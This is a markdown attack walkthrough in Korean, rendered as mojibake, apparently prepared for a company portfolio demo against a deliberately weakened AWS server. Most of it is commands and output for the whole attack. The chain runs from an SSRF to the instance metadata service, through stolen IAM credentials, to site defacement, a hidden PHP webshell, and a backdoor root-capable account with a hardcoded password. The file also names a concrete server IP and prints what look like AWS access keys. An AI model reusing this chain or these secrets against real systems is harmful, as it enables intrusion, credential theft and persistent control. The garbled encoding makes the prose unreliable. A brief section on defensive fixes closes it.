# ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì™„ì „ ìš”ì•½

## ğŸ¯ ì „ì²´ ê³µê²© íë¦„

```
[ê°œë°œìì˜ ì‘ì€ ì‹¤ìˆ˜]
      â†“
[Stage 1] ì„œë²„ ì·¨ì•½ì  ë°œê²¬
      â†“
[Stage 2] AWS ìê²© ì¦ëª… íƒˆì·¨
      â†“
[Stage 3] ì„œë²„ ì ‘ê·¼ ê¶Œí•œ íšë“
      â†“
[Stage 4] ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°
      â†“
[Stage 5] ë°±ë„ì–´ ê³„ì • ìƒì„±
      â†“
[âœ… ì™„ì „í•œ ì„œë²„ ì¥ì•…]
```

---

## ğŸ“ ê° ë‹¨ê³„ë³„ ì‹¤í–‰ ë°©ë²•

### Stage 0: ì¤€ë¹„ (ê³µê²©ì ë¡œì»¬)

```bash
# 1. Tor ì„¤ì¹˜ ë° ì‹¤í–‰ (ìµëª…í™”)
brew install tor  # macOS
sudo apt install tor  # Linux
tor &

# 2. í•„ìš”í•œ Python íŒ¨í‚¤ì§€ ì„¤ì¹˜
pip3 install requests[socks]

# 3. AWS CLI ì„¤ì¹˜
brew install awscli  # macOS
```

---

### Stage 1: ì„œë²„ ì·¨ì•½ì  ìƒì„± (íƒ€ê²Ÿ ì„œë²„ì—ì„œ)

**ëª©ì :** ê³µê²© ê°€ëŠ¥í•œ í™˜ê²½ ë§Œë“¤ê¸°

**ì„œë²„ì—ì„œ ì‹¤í–‰:**
```bash
# 119_setup_aws_vuln.sh ì—…ë¡œë“œ
scp 119_setup_aws_vuln.sh ec2-user@52.79.240.83:/tmp/

# SSH ì ‘ì†
ssh ec2-user@52.79.240.83

# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
sudo bash /tmp/119_setup_aws_vuln.sh
```

**ì´ ìŠ¤í¬ë¦½íŠ¸ê°€ ë§Œë“œëŠ” ì·¨ì•½ì :**
1. **IMDSv1 í™œì„±í™”** - AWS ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ v1 í—ˆìš©
2. **/api/health.php ìƒì„±** - SSRF ì·¨ì•½ì  ì—”ë“œí¬ì¸íŠ¸
3. **ModSecurity ì˜ˆì™¸ ì„¤ì •** - /api/health.phpëŠ” WAF ìš°íšŒ
4. **Apache ì¬ì‹œì‘** - ì„¤ì • ì ìš©

**ê²°ê³¼ í™•ì¸:**
```bash
curl http://52.79.240.83/api/health.php
# {"status":"ok","timestamp":...}
```

---

### Stage 2: AWS ìê²© ì¦ëª… íƒˆì·¨ (ê³µê²©ì ë¡œì»¬)

**ëª©ì :** SSRFë¥¼ í†µí•´ AWS IAM ìê²© ì¦ëª… íšë“

**ì‹¤í–‰:**
```bash
# Torê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸
ps aux | grep tor

# 120_aws_imds_exploit.py ì‹¤í–‰
python3 120_aws_imds_exploit.py 52.79.240.83
```

**ê³µê²© ê³¼ì •:**
1. `/api/health.php?check=metadata&url=http://169.254.169.254/...` ìš”ì²­
2. ModSecurity ìš°íšŒ (health.phpëŠ” ì˜ˆì™¸)
3. IMDSì—ì„œ IAM Role ì •ë³´ ì¶”ì¶œ
4. ìê²© ì¦ëª… íƒˆì·¨:
   - AccessKeyId
   - SecretAccessKey
   - SessionToken

**ê²°ê³¼ íŒŒì¼:**
- `aws_stolen_<timestamp>.sh` - AWS CLI ì„¤ì •
- `aws_stolen_<timestamp>.json` - JSON í˜•ì‹ ìê²© ì¦ëª…

**íšë“í•œ ê¶Œí•œ:**
```
Role: EC2-SSM-Role
ê¶Œí•œ:
  - EC2 ì¸ìŠ¤í„´ìŠ¤ ê´€ë¦¬
  - Systems Manager (SSM)
  - S3 ì ‘ê·¼ (ì¼ë¶€)
```

---

### Stage 3: AWS ê¶Œí•œ í™•ì¸ (ê³µê²©ì ë¡œì»¬)

**ëª©ì :** íƒˆì·¨í•œ ìê²© ì¦ëª…ìœ¼ë¡œ í•  ìˆ˜ ìˆëŠ” ê²ƒ í™•ì¸

**ì‹¤í–‰:**
```bash
# ìê²© ì¦ëª… ì„¤ì •
source aws_stolen_<timestamp>.sh

# ì‹ ì› í™•ì¸
aws sts get-caller-identity --region ap-northeast-2

# ê¶Œí•œ í…ŒìŠ¤íŠ¸
python3 121_aws_privilege_escalation.py
```

**í™•ì¸ ì‚¬í•­:**
- EC2 ì¸ìŠ¤í„´ìŠ¤ ëª©ë¡ ì¡°íšŒ ê°€ëŠ¥
- RDS ë°ì´í„°ë² ì´ìŠ¤ ì •ë³´ ì¡°íšŒ ê°€ëŠ¥
- S3 ë²„í‚· ëª©ë¡ í™•ì¸ ê°€ëŠ¥
- IAM ì •ì±… í™•ì¸ ê°€ëŠ¥

---

### Stage 4A: ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° (ë°©ë²• 1 - ìë™)

**ëª©ì :** ì„œë²„ë¥¼ ì¥ì•…í•˜ê³  ì›¹ì‚¬ì´íŠ¸ë¥¼ í•´í‚¹ í˜ì´ì§€ë¡œ ë³€ì¡°

**ì‹¤í–‰:**
```bash
# AWS ìê²© ì¦ëª… ì„¤ì •
source aws_stolen_<timestamp>.sh

# ìë™ ì‹¤í–‰ ìŠ¤í¬ë¦½íŠ¸
bash 124_execute_deface.sh
```

**ì´ ìŠ¤í¬ë¦½íŠ¸ê°€ í•˜ëŠ” ì¼:**
1. EC2 Instance Connectë¡œ ì„œë²„ ì ‘ì† ì‹œë„
2. defacewebsite.sh ì—…ë¡œë“œ
3. ì„œë²„ì—ì„œ ì‹¤í–‰ (sudo ê¶Œí•œ)
4. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° í™•ì¸
5. ë£¨íŠ¸ ê¶Œí•œ ì¦ê±° ìˆ˜ì§‘

---

### Stage 4B: ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° (ë°©ë²• 2 - ìˆ˜ë™)

**ì„œë²„ì— ì§ì ‘ ì ‘ì†:**
```bash
# defacewebsite.sh ì—…ë¡œë“œ
scp defacewebsite.sh ec2-user@52.79.240.83:/tmp/

# SSH ì ‘ì†
ssh ec2-user@52.79.240.83

# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ (ë£¨íŠ¸ ê¶Œí•œ)
sudo bash /tmp/defacewebsite.sh
```

**defacewebsite.shê°€ í•˜ëŠ” ì¼:**
1. `/var/www/html/www/index.php` ë°±ì—…
2. í•´í‚¹ í˜ì´ì§€ë¡œ êµì²´:
   - Matrix rain effect (ë…¹ìƒ‰ ë¬¸ì ì• ë‹ˆë©”ì´ì…˜)
   - "SYSTEM COMPROMISED" ë©”ì‹œì§€
   - ê³µê²© ì²´ì¸ ì„¤ëª…
3. ë°±ë„ì–´ ì›¹ì‰˜ ìƒì„± (`.system.php`)

**ë³€ì¡° í™•ì¸:**
```bash
# ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†
http://52.79.240.83/www/

# ë°±ë„ì–´ ì›¹ì‰˜ í…ŒìŠ¤íŠ¸
curl "http://52.79.240.83/www/.system.php?cmd=whoami"
# apache
```

---

### Stage 5: ë°±ë„ì–´ ê³„ì • ìƒì„± (ê³µê²©ì ë¡œì»¬)

**ëª©ì :** ì§€ì†ì ì¸ ì ‘ê·¼ì„ ìœ„í•œ ë°±ë„ì–´ SSH ê³„ì • ìƒì„±

**ì‹¤í–‰:**
```bash
# Tor ì‹¤í–‰ í™•ì¸
tor &

# ë°±ë„ì–´ ê³„ì • ìƒì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
python3 125_create_backdoor_access.py 52.79.240.83
```

**ì´ ìŠ¤í¬ë¦½íŠ¸ê°€ í•˜ëŠ” ì¼:**
1. SSH í‚¤ í˜ì–´ ìƒì„± (`~/.ssh/hacker_backdoor`)
2. ì›¹ì‰˜ì„ í†µí•´ ì„œë²„ì— ëª…ë ¹ ì „ì†¡:
   ```bash
   sudo useradd -m -s /bin/bash hacker
   echo 'hacker:H4ck3r!P@ssw0rd2024' | sudo chpasswd
   echo 'hacker ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/hacker
   ```
3. SSH ê³µê°œí‚¤ë¥¼ ì„œë²„ì— ë“±ë¡:
   ```bash
   sudo mkdir -p /home/hacker/.ssh
   echo "ssh-rsa AAA..." | sudo tee /home/hacker/.ssh/authorized_keys
   ```
4. SSH ì ‘ì† í…ŒìŠ¤íŠ¸
5. ì—°ê²° ìŠ¤í¬ë¦½íŠ¸ ìƒì„± (`connect_backdoor.sh`)

**ê²°ê³¼ íŒŒì¼:**
- `~/.ssh/hacker_backdoor` - SSH ê°œì¸í‚¤
- `~/.ssh/hacker_backdoor.pub` - SSH ê³µê°œí‚¤
- `connect_backdoor.sh` - ê°„í¸ ì ‘ì† ìŠ¤í¬ë¦½íŠ¸
- `backdoor_commands.txt` - ëª…ë ¹ì–´ ëª¨ìŒ
- `backdoor_evidence_<timestamp>.txt` - ì¦ê±° íŒŒì¼

---

## ğŸ”‘ ë°±ë„ì–´ ì ‘ì† ë°©ë²•

### ë°©ë²• 1: ìŠ¤í¬ë¦½íŠ¸ ì‚¬ìš© (ê°€ì¥ ê°„ë‹¨)
```bash
bash connect_backdoor.sh
```

### ë°©ë²• 2: SSH í‚¤ë¡œ ì§ì ‘ ì ‘ì†
```bash
ssh -i ~/.ssh/hacker_backdoor hacker@52.79.240.83
```

### ë°©ë²• 3: ë¹„ë°€ë²ˆí˜¸ë¡œ ì ‘ì†
```bash
ssh hacker@52.79.240.83
# ë¹„ë°€ë²ˆí˜¸: H4ck3r!P@ssw0rd2024
```

### ë°©ë²• 4: ì›ê²© ëª…ë ¹ ì‹¤í–‰
```bash
ssh -i ~/.ssh/hacker_backdoor hacker@52.79.240.83 'sudo whoami'
# root
```

---

## ğŸ“Š ê³µê²© ì„±ê³µ ì¦ê±°

### 1. ë³€ì¡°ëœ ì›¹ì‚¬ì´íŠ¸
**URL:** http://52.79.240.83/www/

**í™•ì¸ ì‚¬í•­:**
- â˜ ï¸ í•´ê³¨ ì•„ì´ì½˜
- "SYSTEM COMPROMISED" í° ì œëª©
- Matrix rain effect ë°°ê²½
- ê³µê²© ì²´ì¸ ì„¤ëª…:
  ```
  1. ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œ
  2. ë‹¨ í•˜ë‚˜ì˜ ì‘ì€ í‹ˆ: /api/health.php
  3. SSRF â†’ IMDS â†’ ìê²© ì¦ëª… íƒˆì·¨
  4. AWS ê¶Œí•œ â†’ ì„œë²„ ì ‘ê·¼
  5. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° + ë°±ë„ì–´
  ```

### 2. ë°±ë„ì–´ ì›¹ì‰˜
```bash
curl "http://52.79.240.83/www/.system.php?cmd=whoami"
# apache

curl "http://52.79.240.83/www/.system.php?cmd=id"
# uid=48(apache) gid=48(apache) groups=48(apache)

curl "http://52.79.240.83/www/.system.php?cmd=hostname"
# ip-172-31-x-x.ap-northeast-2.compute.internal
```

### 3. ë°±ë„ì–´ SSH ê³„ì •
```bash
ssh -i ~/.ssh/hacker_backdoor hacker@52.79.240.83

hacker@server:~$ whoami
hacker

hacker@server:~$ id
uid=1001(hacker) gid=1001(hacker) groups=1001(hacker)

hacker@server:~$ sudo -l
User hacker may run the following commands on server:
    (ALL) NOPASSWD: ALL

hacker@server:~$ sudo whoami
root
```

### 4. íŒŒì¼ ì‹œìŠ¤í…œ ë³€ê²½
```bash
# ì„œë²„ì—ì„œ
ls -la /var/www/html/www/index.php*
# -rw-r--r-- 1 apache apache 8524 Nov 16 12:34 index.php
# -rw-r--r-- 1 apache apache 2341 Nov 14 10:12 index.php.original

ls -la /var/www/html/www/.system.php
# -rw-r--r-- 1 apache apache 120 Nov 16 12:34 .system.php

cat /etc/passwd | grep hacker
# hacker:x:1001:1001::/home/hacker:/bin/bash

sudo cat /etc/sudoers.d/hacker
# hacker ALL=(ALL) NOPASSWD:ALL
```

### 5. AWS ìê²© ì¦ëª… íƒˆì·¨ ì¦ê±°
```bash
cat aws_stolen_<timestamp>.json
{
  "credentials": {
    "AccessKeyId": "ASIASO4TYV4OK2MJVZDV",
    "SecretAccessKey": "7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE",
    "Token": "IQoJb3JpZ2luX2VjEM...",
    "Type": "AWS-HMAC",
    "Expiration": "2025-11-16T13:52:44Z"
  },
  "metadata": {
    "instance-id": "i-08f3cc62a529c9daf",
    "instance-type": "t2.micro",
    "local-ipv4": "172.31.x.x",
    "public-ipv4": "52.79.240.83"
  },
  "stolen_at": "2025-11-16T17:13:22",
  "method": "health.php SSRF + IMDSv1"
}
```

---

## ğŸ“ í¬íŠ¸í´ë¦¬ì˜¤ í”„ë ˆì  í…Œì´ì…˜ìš© ìŠ¤í† ë¦¬

### ë„ì…: ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œ

> "ì´ ì„œë²„ëŠ” ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œì„ ê°–ì¶”ê³  ìˆì—ˆìŠµë‹ˆë‹¤."

- **ModSecurity WAF** (OWASP CRS)
  - SQL Injection ì°¨ë‹¨
  - XSS ì°¨ë‹¨
  - Path Traversal ì°¨ë‹¨
  - ëª¨ë“  ì›¹ ê³µê²© íŒ¨í„´ ì°¨ë‹¨

- **Splunk SIEM**
  - ì‹¤ì‹œê°„ ë¡œê·¸ ëª¨ë‹ˆí„°ë§
  - ì´ìƒ í–‰ìœ„ íƒì§€
  - ê³µê²© íŒ¨í„´ ë¶„ì„

- **PHP disable_functions**
  - `system()`, `exec()`, `shell_exec()` ì°¨ë‹¨
  - `passthru()`, `popen()` ì°¨ë‹¨
  - ëª¨ë“  ìœ„í—˜í•œ í•¨ìˆ˜ ë¹„í™œì„±í™”

- **íŒŒì¼ ì—…ë¡œë“œ í•„í„°ë§**
  - .php, .sh í™•ì¥ì ì°¨ë‹¨
  - ì›¹ì‰˜ íŒ¨í„´ íƒì§€

- **AWS Security**
  - Security Group (ë°©í™”ë²½)
  - IAM Role (ìµœì†Œ ê¶Œí•œ ì›ì¹™)
  - ë„¤íŠ¸ì›Œí¬ ACL

### ì „ê°œ: ì‘ì€ í‹ˆì˜ ë°œê²¬

> "í•˜ì§€ë§Œ ê°œë°œìëŠ” **ë‹¨ í•˜ë‚˜ì˜ ì‘ì€ ì‹¤ìˆ˜**ë¥¼ í–ˆìŠµë‹ˆë‹¤."

**ì‹¤ìˆ˜ 1: Health Check ì˜ˆì™¸ ì²˜ë¦¬**
```apache
# /etc/httpd/conf.d/modsecurity.conf
<LocationMatch "/api/health\.php">
    SecRuleEngine Off    # â† ì´ê²ƒ!
</LocationMatch>
```

**ì´ìœ :**
- ë¡œë“œ ë°¸ëŸ°ì„œì˜ health checkê°€ ModSecurityì— ì°¨ë‹¨ë¨
- ì„œë¹„ìŠ¤ ê°€ìš©ì„±ì„ ìœ„í•´ ì˜ˆì™¸ ì²˜ë¦¬
- "health checkëŠ” ì•ˆì „í•˜ë‹¤"ëŠ” ì˜ëª»ëœ ê°€ì •

**ë¬¸ì œ:**
- `/api/health.php`ì— **SSRF ì·¨ì•½ì ** ì¡´ì¬
- `?check=metadata&url=<URL>` íŒŒë¼ë¯¸í„°ë¡œ ë‚´ë¶€ ìš”ì²­ ê°€ëŠ¥
- ModSecurityê°€ ì´ë¥¼ ì°¨ë‹¨í•˜ì§€ ëª»í•¨

**ì‹¤ìˆ˜ 2: IMDSv1 í™œì„±í™”**
```bash
# EC2 Instance Metadata Options
HttpTokens: optional    # â† IMDSv1 í—ˆìš©!
```

**ì´ìœ :**
- ë ˆê±°ì‹œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ì˜ í˜¸í™˜ì„±
- "ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ë‹ˆê¹Œ ì•ˆì „í•˜ë‹¤"ëŠ” ì˜ëª»ëœ ê°€ì •

**ë¬¸ì œ:**
- IMDSv1ì€ ë‹¨ìˆœ HTTP GETìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥
- SSRF ê³µê²©ì— ì·¨ì•½
- 169.254.169.254 â†’ IAM ìê²© ì¦ëª… ìœ ì¶œ

### ìœ„ê¸°: ê³µê²© ì²´ì¸ì˜ ì‹œì‘

> "ê³µê²©ìëŠ” ì´ **ì‘ì€ í‹ˆ**ì„ ë°œê²¬í•˜ê³ , ì „ì²´ ì‹œìŠ¤í…œì„ ë¬´ë„ˆëœ¨ë ¸ìŠµë‹ˆë‹¤."

**Step 1: ì •ì°° (Reconnaissance)**
```bash
nmap -p- 52.79.240.83
nikto -h http://52.79.240.83
dirb http://52.79.240.83
```

**Step 2: ì·¨ì•½ì  ë°œê²¬**
```bash
curl "http://52.79.240.83/api/health.php?check=metadata&url=http://169.254.169.254/"
# ì„±ê³µ! IMDS ì ‘ê·¼ ê°€ëŠ¥
```

**Step 3: ìê²© ì¦ëª… íƒˆì·¨**
```python
# 120_aws_imds_exploit.py
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
credentials = ssrf_request(url)
# AccessKeyId, SecretAccessKey, SessionToken íšë“!
```

**Step 4: AWS ê¶Œí•œ í™•ì¸**
```bash
aws sts get-caller-identity
# ì„±ê³µ! EC2-SSM-Role ê¶Œí•œ íšë“

aws ec2 describe-instances
# ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ ì •ë³´ ì¡°íšŒ ê°€ëŠ¥
```

**Step 5: ì„œë²„ ì ‘ê·¼**
```bash
aws ssm start-session --target i-08f3cc62a529c9daf
# ì„œë²„ ì ‘ê·¼ ì„±ê³µ! (ë˜ëŠ” EC2 Instance Connect)
```

**Step 6: ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°**
```bash
sudo bash defacewebsite.sh
# index.php â†’ "SYSTEM COMPROMISED"
# .system.php â†’ ë°±ë„ì–´ ì›¹ì‰˜
```

**Step 7: ë°±ë„ì–´ ê³„ì •**
```bash
python3 125_create_backdoor_access.py
# hacker ì‚¬ìš©ì ìƒì„± (sudo NOPASSWD)
# SSH í‚¤ ë“±ë¡
# ì§€ì†ì ì¸ ì ‘ê·¼ í™•ë³´
```

### ê²°ë§: ì™„ì „í•œ ì¥ì•…

> "ì´ì œ ì´ ì„œë²„ëŠ” ì™„ì „íˆ ê³µê²©ìì˜ ê²ƒì…ë‹ˆë‹¤."

**íšë“í•œ ê²ƒ:**
1. âœ… **ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°** - ëª¨ë“  ë°©ë¬¸ìì—ê²Œ í•´í‚¹ í˜ì´ì§€ í‘œì‹œ
2. âœ… **ë°±ë„ì–´ ì›¹ì‰˜** - ì›¹ ë¸Œë¼ìš°ì €ë¡œ ëª…ë ¹ì–´ ì‹¤í–‰
3. âœ… **ë°±ë„ì–´ SSH ê³„ì •** - ì–¸ì œë“ ì§€ ì„œë²„ ì ‘ì†
4. âœ… **ë£¨íŠ¸ ê¶Œí•œ** - ëª¨ë“  ì‹œìŠ¤í…œ ì œì–´
5. âœ… **AWS ìê²© ì¦ëª…** - ì „ì²´ ì¸í”„ë¼ ì ‘ê·¼
6. âœ… **ì§€ì†ì„± (Persistence)** - ì„œë²„ ì¬ì‹œì‘ í›„ì—ë„ ì ‘ê·¼ ìœ ì§€

**ê³µê²© íƒ€ì„ë¼ì¸:**
- **T+0ë¶„:** health.php ë°œê²¬
- **T+5ë¶„:** SSRF ì·¨ì•½ì  í™•ì¸
- **T+10ë¶„:** AWS ìê²© ì¦ëª… íƒˆì·¨
- **T+15ë¶„:** ì„œë²„ ì ‘ê·¼ ê¶Œí•œ íšë“
- **T+20ë¶„:** ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°
- **T+25ë¶„:** ë°±ë„ì–´ ê³„ì • ìƒì„±
- **T+30ë¶„:** âœ… **ì™„ì „í•œ ì„œë²„ ì¥ì•…**

### êµí›ˆ: Defense in Depthì˜ ì¤‘ìš”ì„±

> "ì™„ë²½í•œ ë³´ì•ˆì€ ì—†ìŠµë‹ˆë‹¤. ì—¬ëŸ¬ ê³„ì¸µì˜ ë…ë¦½ì ì´ê³  ê°•ë ¥í•œ ë³´ì•ˆì´ í•„ìš”í•©ë‹ˆë‹¤."

**ì‹¤íŒ¨í•œ ê³„ì¸µ:**
1. âŒ **ì˜ˆì™¸ ì²˜ë¦¬** - health.php WAF ìš°íšŒ
2. âŒ **SSRF ë°©ì–´** - URL í•„í„°ë§ ë¶€ì¬
3. âŒ **IMDSv1** - í† í° ì¸ì¦ ë¶€ì¬
4. âŒ **ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬** - IMDS ì ‘ê·¼ ê°€ëŠ¥
5. âŒ **ê¶Œí•œ ë¶„ë¦¬** - ec2-userì˜ ê³¼ë„í•œ sudo ê¶Œí•œ

**ê°œì„  ë°©ì•ˆ:**
1. âœ… **IMDSv2 ê°•ì œ** - `HttpTokens=required`
2. âœ… **SSRF ë°©ì–´** - IP í•„í„°ë§ (169.254.0.0/16 ì°¨ë‹¨)
3. âœ… **ìµœì†Œ WAF ì˜ˆì™¸** - health.phpë„ ìµœì†Œ ê²€ì¦
4. âœ… **ë„¤íŠ¸ì›Œí¬ ë ˆë²¨ ì°¨ë‹¨** - iptablesë¡œ IMDS ì°¨ë‹¨
5. âœ… **ê¶Œí•œ ìµœì†Œí™”** - ec2-userì˜ sudo ê¶Œí•œ ì œí•œ
6. âœ… **ì •ê¸° ê°ì‚¬** - ì‚¬ìš©ì ê³„ì •, SSH í‚¤, sudoers ì ê²€

---

## ğŸ“ íŒŒì¼ ì°¸ì¡°

### ê³µê²© ìŠ¤í¬ë¦½íŠ¸
- `119_setup_aws_vuln.sh` - [Stage 1] ì„œë²„ ì·¨ì•½ì  ì„¤ì •
- `120_aws_imds_exploit.py` - [Stage 2] IMDS ê³µê²© ë° ìê²© ì¦ëª… íƒˆì·¨
- `121_aws_privilege_escalation.py` - [Stage 2+] AWS ê¶Œí•œ í™•ì¸
- `122_aws_ssm_command.py` - [Stage 3] AWS SSM ì›ê²© ëª…ë ¹ ì‹¤í–‰
- `123_root_takeover.py` - [Stage 4] ìë™í™”ëœ ì„œë²„ ì¥ì•…
- `124_execute_deface.sh` - [Stage 4] ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ì‹¤í–‰
- `125_create_backdoor_access.py` - [Stage 5] ë°±ë„ì–´ ê³„ì • ìƒì„±

### ì„œë²„ íŒŒì¼
- `defacewebsite.sh` - ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° ìŠ¤í¬ë¦½íŠ¸ (ì„œë²„ ì‹¤í–‰ìš©)
- `health.php` - SSRF ì·¨ì•½ì  ì—”ë“œí¬ì¸íŠ¸ (ì„œë²„ ì—…ë¡œë“œìš©)
- `backdoor.php` - ì¶”ê°€ ë°±ë„ì–´ PHP

### ë¬¸ì„œ
- `README.md` - ì „ì²´ í”„ë¡œì íŠ¸ ê°œìš”
- `ATTACK_SUMMARY.md` - ì´ íŒŒì¼ (ê³µê²© ìš”ì•½)
- `EXECUTE_STEPS.md` - ë‹¨ê³„ë³„ ì‹¤í–‰ ê°€ì´ë“œ
- `CREATE_ROOT_USER_ANALYSIS.md` - ë°±ë„ì–´ ê³„ì • ë¶„ì„
- `STAGE_1_CREATE_VULNERABILITY.md` - ì·¨ì•½ì  ìƒì„± ê°€ì´ë“œ

---

## ğŸ¬ ë°ëª¨ ì‹œë‚˜ë¦¬ì˜¤

### ì‹œë‚˜ë¦¬ì˜¤ 1: ë¼ì´ë¸Œ ê³µê²© ë°ëª¨ (30ë¶„)

1. **ì¤€ë¹„ (5ë¶„)**
   - Tor ì‹¤í–‰
   - íƒ€ê²Ÿ ì„œë²„ í™•ì¸
   - ë„êµ¬ ì¤€ë¹„

2. **ì·¨ì•½ì  ë°œê²¬ (5ë¶„)**
   - í¬íŠ¸ ìŠ¤ìº”
   - ë””ë ‰í„°ë¦¬ ë¸Œë£¨íŠ¸í¬ìŠ¤
   - health.php ë°œê²¬

3. **SSRF ê³µê²© (5ë¶„)**
   - IMDS ì ‘ê·¼ í…ŒìŠ¤íŠ¸
   - IAM ìê²© ì¦ëª… íƒˆì·¨
   - AWS ê¶Œí•œ í™•ì¸

4. **ì„œë²„ ì ‘ê·¼ (5ë¶„)**
   - AWS CLI ì„¤ì •
   - SSM/EC2 Instance Connect
   - ì„œë²„ ì ‘ì†

5. **ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° (5ë¶„)**
   - defacewebsite.sh ì‹¤í–‰
   - í•´í‚¹ í˜ì´ì§€ í™•ì¸
   - ë°±ë„ì–´ ì›¹ì‰˜ í…ŒìŠ¤íŠ¸

6. **ë°±ë„ì–´ ê³„ì • (5ë¶„)**
   - SSH ê³„ì • ìƒì„±
   - í‚¤ í˜ì–´ ë“±ë¡
   - ì ‘ì† í…ŒìŠ¤íŠ¸

### ì‹œë‚˜ë¦¬ì˜¤ 2: ì‚¬í›„ ë¶„ì„ (20ë¶„)

1. **ê³µê²© í”ì  ë¶„ì„**
   - Apache access log
   - CloudTrail (AWS API í˜¸ì¶œ)
   - ë³€ì¡°ëœ íŒŒì¼ í™•ì¸

2. **ë³´ì•ˆ ê°œì„  ì œì•ˆ**
   - IMDSv2 ê°•ì œ
   - SSRF ë°©ì–´
   - WAF ì˜ˆì™¸ ìµœì†Œí™”

3. **Q&A**

---

ì´ ë¬¸ì„œëŠ” íšŒì‚¬ í¬íŠ¸í´ë¦¬ì˜¤ í”„ë ˆì  í…Œì´ì…˜ì„ ìœ„í•œ ìë£Œì…ë‹ˆë‹¤.
